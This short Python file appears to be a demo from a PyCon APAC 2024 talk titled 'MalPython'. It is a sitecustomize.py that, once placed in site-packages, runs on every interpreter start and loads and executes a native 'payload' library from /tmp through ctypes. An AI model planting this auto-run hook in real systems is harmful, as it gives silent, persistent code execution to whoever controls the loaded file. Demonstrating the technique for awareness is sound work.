print("PyCon APAC 2024: MalPython (sitecustomize.py)")


# Put this on site-packages directory

import ctypes
import sys
import os

if sys.platform == "win32":
    libname = "payload.pyd"
else:
    libname = "payload.so"

path = os.path.join("/tmp", libname)
lib  = ctypes.CDLL(path)

lib.execute()